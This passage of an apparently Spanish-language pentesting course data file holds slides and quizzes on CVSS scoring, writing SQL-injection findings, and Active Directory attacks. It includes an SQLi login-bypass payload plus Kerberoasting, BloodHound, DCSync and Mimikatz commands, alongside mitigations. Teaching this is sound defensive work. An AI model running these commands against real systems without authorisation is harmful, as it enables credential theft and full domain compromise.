Ejemplo — SQLi en login web:
AV:N (Network, accesible desde internet)
AC:L (Low, fácil de explotar)
PR:N (None, no necesita autenticación)
UI:N (None, no requiere interacción del usuario)
S:C (Changed, afecta la base de datos también)
C:H (High, puede leer toda la DB)
I:H (High, puede modificar datos)
A:L (Low, puede afectar disponibilidad)

Resultado: CVSS 9.8 — Crítico

Calculadora online: cvss-calculator.com o nvd.nist.gov/vuln-metrics/cvss/v3-calculator`
          },
          {
            tag: "HALLAZGO",
            titulo: "Cómo redactar un hallazgo",
            contenido: `Cada hallazgo sigue un formato consistente. Aquí un ejemplo real:

HALLAZGO: SQL Injection en panel de login
CVSS: 9.8 (Crítico)
CVE RELACIONADO: CWE-89

DESCRIPCIÓN:
El campo "email" del formulario de autenticación en https://drupal.example.com/user/login es vulnerable a SQL Injection. El servidor construye la query de autenticación concatenando directamente el input del usuario sin sanitización ni uso de Prepared Statements.

PASOS DE REPRODUCCIÓN:
1. Navegar a https://drupal.example.com/user/login
2. Ingresar en el campo email: ' OR '1'='1
3. Ingresar cualquier valor en el campo password
4. Hacer click en "Iniciar sesión"
5. Observar acceso concedido como administrador

EVIDENCIA: [Captura 01 - SQLi_bypass.png]

IMPACTO:
Un atacante no autenticado puede autenticarse en el panel de administración sin credenciales válidas, obteniendo control total del CMS. Adicionalmente, es posible extraer la base de datos completa incluyendo credenciales de usuarios y datos de clientes.

RECOMENDACIÓN:
Implementar Prepared Statements (Parametrized Queries) en todas las consultas SQL. Ejemplo en PHP: $stmt = $pdo->prepare('SELECT * FROM users WHERE email = ?'); $stmt->execute([$email]);
Referencia: OWASP SQL Injection Prevention Cheat Sheet.`
          },
          {
            tag: "RECOMENDACIONES",
            titulo: "Recomendaciones que el cliente puede ejecutar",
            contenido: `Una recomendación vaga no sirve. "Mejorar la seguridad" no le dice al desarrollador qué hacer el lunes.

UNA MALA RECOMENDACION:
"Sanitizar los inputs del usuario para prevenir ataques de inyección."

UNA BUENA RECOMENDACION:
"Reemplazar la construcción dinámica de queries SQL con Prepared Statements en todas las consultas de la aplicación. En PHP/PDO: $stmt = $pdo->prepare('SELECT * FROM users WHERE email = ?'); $stmt->execute([$email]);. Para el framework Drupal específicamente, usar la Database API: db_query('SELECT * FROM {users} WHERE email = :email', [':email' => $email]);. Referencia técnica: OWASP SQL Injection Prevention Cheat Sheet (https://cheatsheetseries.owasp.org)."

Cada recomendación debe responder:
— QUÉ hacer exactamente (no "mejorar", sino la acción específica)
— CÓMO hacerlo (ejemplo de código o configuración)
— DÓNDE aplicarlo (archivo, función, componente específico)
— Referencia a estándar o documentación

Incluir también la PRIORIDAD:
Crítico → arreglar en las próximas 24-48 horas
Alto → arreglar en la próxima semana
Medio → arreglar en el próximo sprint
Bajo → arreglar en la próxima versión mayor`
          },
        ],
        quiz: [
          {
            q: "¿Por qué el informe tiene secciones separadas para ejecutivos y técnicos?",
            opts: ["Para hacer el informe más largo y justificar el precio", "Porque tienen necesidades completamente distintas: los ejecutivos toman decisiones de negocio y riesgo, los técnicos necesitan detalles para reproducir y arreglar vulnerabilidades", "Por un requisito legal de todos los estándares de seguridad", "Para que el cliente pague por dos informes separados"],
            c: 1,
            e: "El resumen ejecutivo responde '¿estamos en riesgo y cuánto cuesta arreglarlo?' para quien aprueba el presupuesto. Los hallazgos técnicos responden '¿cómo reproduzco y arreglo esto?' para quien implementa los cambios. Mezclarlos hace el informe inútil para ambas audiencias."
          },
          {
            q: "Una vulnerabilidad de SQLi tiene CVSS 9.8 y otra de XSS tiene CVSS 6.5. ¿Siempre priorizas la SQLi?",
            opts: ["Sí, siempre se ordena por puntuación CVSS de mayor a menor", "No necesariamente — el contexto importa. Si el XSS está en el panel admin que todos usan y la SQLi está en un sistema de staging sin datos reales, el impacto real puede ser inverso", "Sí, CVSS es absoluto y no depende del contexto", "No, siempre se prioriza por el costo de remedación"],
            c: 1,
            e: "CVSS mide severidad técnica abstracta. La priorización real combina CVSS + contexto del negocio: ¿qué sistema es más crítico? ¿Está expuesto a internet? ¿Tiene datos sensibles? ¿Qué impacto tiene en la operación del cliente? Un CVSS 6.5 en un sistema crítico puede ser más urgente que un CVSS 9.8 en un sistema aislado."
          },
          {
            q: "¿Qué hace que una recomendación sea accionable?",
            opts: ["Que use términos técnicos precisos que demuestren expertise", "Que especifique QUÉ hacer, CÓMO hacerlo con ejemplo concreto, DÓNDE aplicarlo y una referencia a documentación oficial", "Que sea lo más breve posible para facilitar la lectura", "Que incluya el tiempo estimado de implementación"],
            c: 1,
            e: "Una recomendación accionable le dice al desarrollador exactamente qué hacer el lunes. 'Sanitizar inputs' no lo hace. 'Usar Prepared Statements, aquí el ejemplo de código para tu framework específico, aquí la documentación de OWASP' sí lo hace."
          },
          {
            q: "El cliente pide el informe en 24 horas pero necesitas más tiempo para documentar bien. ¿Qué haces?",
            opts: ["Entregas en 24 horas aunque quede incompleto — cumplir plazos es lo primero", "Comunicas al cliente que necesitas más tiempo para entregar un informe de calidad, explicas qué está pendiente y acuerdas una nueva fecha realista", "Entregas solo el resumen ejecutivo en 24 horas y el técnico después", "No dices nada y entregas tarde sin avisar"],
            c: 1,
            e: "La comunicación proactiva con el cliente es parte del profesionalismo. Un informe apresurado con hallazgos mal documentados o recomendaciones vagas tiene menos valor que uno bien hecho. El cliente prefiere saberlo con anticipación para planificar."
          },
          {
            q: "¿Qué sección del informe lee primero el CEO de la empresa cliente?",
            opts: ["Los hallazgos técnicos detallados para entender el alcance real", "El resumen ejecutivo — diseñado específicamente para no técnicos, resume el riesgo en lenguaje de negocio y las acciones prioritarias", "Los apéndices con los logs completos de las herramientas", "La sección de metodología para validar que el trabajo fue correcto"],
            c: 1,
            e: "El resumen ejecutivo es la sección más importante estratégicamente. Es lo que el CEO lee, el CISO presenta al board y lo que determina si se aprueba el presupuesto para remedación. Si no está bien escrito en lenguaje de negocio, el informe técnico más brillante no genera cambios."
          },
        ]
      },
    ]
  },

  {
    id: "rt-8",
    nombre: "Active Directory — Atacando el Corazón de Windows",
    icon: "🏰",
    color: "#a855f7",
    tag: "FREE",
    descripcion: "Active Directory controla toda la infraestructura Windows corporativa. Aprende Kerberoasting, Pass-the-Hash, BloodHound y DCSync.",
    lecciones: [
      {
        id: "rt-8-1",
        titulo: "Qué es Active Directory y por qué importa",
        slides: [
          {
            tag: "ACTIVE DIRECTORY",
            titulo: "El directorio que controla todo",
            contenido: `Active Directory (AD) es el servicio de Microsoft para gestionar identidades y acceso en redes Windows corporativas. Si una empresa usa Windows en sus servidores y computadoras, casi con certeza tiene Active Directory.

Estructura básica:

DOMINIO → la unidad administrativa central
Ejemplo: corp.lumina.local
Todos los usuarios, computadoras e impresoras del dominio son gestionados centralmente.

DOMAIN CONTROLLER (DC) → el servidor que gestiona el dominio
Almacena todas las credenciales
Autentica a todos los usuarios
Aplica todas las políticas de seguridad
Controla el acceso a todos los recursos

USUARIOS → cuentas del dominio
johndoe@corp.lumina.local puede iniciar sesión en cualquier computadora del dominio.

GRUPOS → colecciones de usuarios con los mismos permisos
Domain Admins → acceso total a todo el dominio
Enterprise Admins → acceso a todos los dominios del forest

Si comprometes el Domain Controller → tienes control total de todo. Cada usuario, cada computadora, cada servidor del dominio. Es el objetivo final de cualquier red Windows corporativa.`
          },
          {
            tag: "KERBEROS",
            titulo: "Cómo funciona la autenticación Kerberos",
            contenido: `Active Directory usa Kerberos para autenticar usuarios. Entenderlo es fundamental para entender los ataques.

FLUJO DE AUTENTICACION:

1. El usuario se autentica en el DC
   → El DC emite un Ticket Granting Ticket (TGT)
   → Cifrado con el hash de la contraseña de la cuenta krbtgt

2. El usuario quiere acceder a un servicio (ej: SQL Server)
   → Presenta el TGT al DC y pide un Ticket Granting Service (TGS)
   → El DC emite el TGS cifrado con el hash de la cuenta del servicio

3. El usuario presenta el TGS al servicio
   → El servicio descifra el TGS con su propio hash
   → Si es válido, permite el acceso

PUNTOS CLAVE PARA LOS ATAQUES:
— El TGS está cifrado con el hash de la cuenta del servicio
— Cualquier usuario del dominio puede pedir un TGS para cualquier servicio
— Si crackeas el hash del TGS, tienes la contraseña de la cuenta del servicio
— Si esa cuenta tiene privilegios elevados... escalaste.

Esto es exactamente lo que explota Kerberoasting.`
          },
          {
            tag: "KERBEROASTING",
            titulo: "Kerberoasting — robar tickets de servicio",
            contenido: `Kerberoasting aprovecha que cualquier usuario autenticado puede pedir un TGS para cualquier cuenta de servicio con SPN (Service Principal Name).

PASO A PASO:

1. Enumerar cuentas de servicio con SPN:
GetUserSPNs.py -request corp.lumina.local/usuario:contraseña

Resultado:
ServicePrincipalName: MSSQLSvc/sqlserver.corp.lumina.local:1433
Nombre de cuenta: svc_sql
Hash: $krb5tgs$23$*svc_sql$...

2. El hash es el TGS cifrado con la contraseña de svc_sql
   Puedes intentar crackearlo offline sin generar más tráfico en la red.

3. Crackear el hash con hashcat:
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt

Si la contraseña de svc_sql es débil, la obtienes en minutos.

POR QUÉ ES PELIGROSO:
— No requiere privilegios especiales — cualquier usuario del dominio puede hacerlo
— El tráfico parece legítimo para los logs del DC
— Las cuentas de servicio frecuentemente tienen contraseñas que nunca se cambian
— Muchas cuentas de servicio tienen privilegios elevados

Mitigación: contraseñas largas (25+) en cuentas de servicio, Group Managed Service Accounts (gMSA).`
          },
          {
            tag: "BLOODHOUND",
            titulo: "BloodHound — mapear Active Directory",
            contenido: `BloodHound es la herramienta más poderosa para analizar Active Directory. Recolecta datos del dominio y los muestra como un grafo de relaciones, revelando caminos de ataque que serían invisibles de otra forma.

COMPONENTES:
SharpHound → recolector de datos (corre en la red del cliente)
BloodHound GUI → visualizador del grafo (corre en tu máquina)
Neo4j → base de datos de grafos donde se almacenan los datos

RECOLECTAR DATOS:
SharpHound.exe -c All
O desde Python:
bloodhound-python -u usuario -p contraseña -d corp.lumina.local -c all

Genera archivos JSON con todos los usuarios, grupos, computadoras, sesiones y permisos del dominio.

IMPORTAR Y ANALIZAR:
1. Importar los JSON en BloodHound
2. Buscar: "Shortest Paths to Domain Admins"
3. BloodHound muestra el camino exacto desde tu cuenta actual hasta Domain Admin

Ejemplo de hallazgo en BloodHound:
Tu cuenta → GenericWrite sobre Grupo_IT → Grupo_IT tiene DCSync rights → Domain Controller

Traducción: puedes modificar el grupo IT, agregar tu cuenta, y con DCSync obtener todos los hashes del dominio.

BloodHound hace visible en 30 segundos lo que tomaría días de análisis manual.`
          },
          {
            tag: "DCSYNC",
            titulo: "DCSync — volverse el Domain Controller",
            contenido: `DCSync es el ataque final en Active Directory. Imita la función de replicación del Domain Controller para extraer los hashes de contraseñas de TODOS los usuarios del dominio, incluido el hash de krbtgt.

PRERREQUISITO:
Necesitas una cuenta con privilegios de replicación (DS-Replication-Get-Changes-All):
— Domain Admins
— Enterprise Admins
— Domain Controllers
— Cuentas con permisos delegados explícitamente

EJECUCIÓN:
Con Impacket:
secretsdump.py corp.lumina.local/Domain_Admin:contraseña@10.0.0.10

Con Mimikatz (desde una sesión en el DC):
lsadump::dcsync /domain:corp.lumina.local /all

RESULTADO:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

Con el hash de krbtgt puedes crear un Golden Ticket — un TGT falso que te da acceso a cualquier recurso del dominio para siempre, incluso si se cambian todas las contraseñas (excepto krbtgt dos veces).

EN EL INFORME:
DCSync exitoso = compromiso total del dominio. Impacto: Crítico. Todas las credenciales del dominio deben considerarse comprometidas.`
          },
        ],
        quiz: [
          {
            q: "¿Por qué el Domain Controller es el objetivo más valioso en una red Windows corporativa?",
            opts: ["Porque tiene el hardware más potente de la red", "Porque almacena todas las credenciales del dominio y controla la autenticación y acceso de todos los usuarios y sistemas — comprometer el DC significa comprometer toda la organización", "Porque tiene más ancho de banda que otros servidores", "Solo es valioso si tiene servicios web expuestos"],
            c: 1,
            e: "El DC es la autoridad central de Active Directory. Controla quién puede autenticarse, qué pueden hacer y a qué pueden acceder. Con acceso al DC puedes crear cuentas, modificar permisos, acceder a cualquier sistema del dominio y extraer todas las credenciales."
          },
          {
            q: "¿Por qué Kerberoasting es difícil de detectar?",
            opts: ["Porque usa tráfico cifrado de extremo a extremo", "Porque la petición de TGS es una operación legítima — cualquier usuario puede pedir tickets de servicio, el tráfico parece normal para los logs del DC", "Porque solo funciona fuera del horario de trabajo", "Porque no genera tráfico de red"],
            c: 1,
            e: "Kerberoasting solicita TGS usando funcionalidades legítimas de Kerberos. El DC registra la petición como una autenticación normal. El crackeo del hash se hace offline, sin más contacto con el DC. Sin alertas específicas para volumen inusual de TGS requests, pasa desapercibido."
          },
          {
            q: "BloodHound muestra que tu cuenta tiene 'GenericWrite' sobre el grupo 'HelpDesk', y HelpDesk tiene 'AdminTo' sobre varios servidores. ¿Cómo lo explicas en el informe?",
            opts: ["Es una configuración normal de Active Directory que no representa riesgo", "Tu cuenta puede modificar la membresía del grupo HelpDesk, agregarte a él, y obtener acceso de administrador local en todos los servidores donde HelpDesk es admin — chain attack documentada con BloodHound", "Solo es relevante si los servidores son Domain Controllers", "El riesgo es bajo porque requiere múltiples pasos"],
            c: 1,
            e: "BloodHound es precisamente para mostrar estos caminos de ataque encadenados. Cada paso individual parece menor, pero la cadena completa tiene impacto crítico. En el informe documentas cada paso del path con screenshots de BloodHound y comandos exactos."
          },
          {
            q: "¿Qué hace que DCSync sea más impactante que cualquier otro ataque en Active Directory?",
            opts: ["Porque es el único que funciona remotamente", "Porque extrae los hashes de TODOS los usuarios del dominio incluyendo krbtgt, permitiendo Pass-the-Hash masivo y Golden Tickets — compromiso total e irrecuperable a menos que se resetee krbtgt dos veces", "Porque no requiere ningún privilegio previo", "Porque funciona en todos los sistemas operativos"],
            c: 1,
            e: "DCSync + hash de krbtgt = Golden Ticket. Un Golden Ticket es un TGT forjado que el DC no puede distinguir de uno legítimo. Técnicamente, si el atacante tiene el hash de krbtgt, puede mantener acceso indefinidamente incluso si se cambian todas las contraseñas del dominio."
          },
          {
            q: "Un cliente tiene cuentas de servicio con contraseñas de 8 caracteres que no se han cambiado en 3 años. ¿Por qué es crítico?",
            opts: ["No es crítico si las contraseñas tienen caracteres especiales", "Kerberoasting puede extraer los hashes TGS de esas cuentas y crackearlos offline — contraseñas cortas y viejas son extremadamente vulnerables a ataques de diccionario con GPUs modernas", "Solo es crítico si las cuentas tienen acceso a internet", "Las contraseñas de servicio no se pueden crackear con métodos modernos"],
            c: 1,
            e: "Una contraseña de 8 caracteres puede crackearse en minutos con hashcat y una GPU moderna, especialmente si es un patrón común. Las cuentas de servicio que nunca cambian contraseña son el objetivo perfecto de Kerberoasting. Recomendación: 25+ caracteres aleatorios o Group Managed Service Accounts (gMSA)."
          },
        ]
      },
    ]
  },
    ]
  },
];
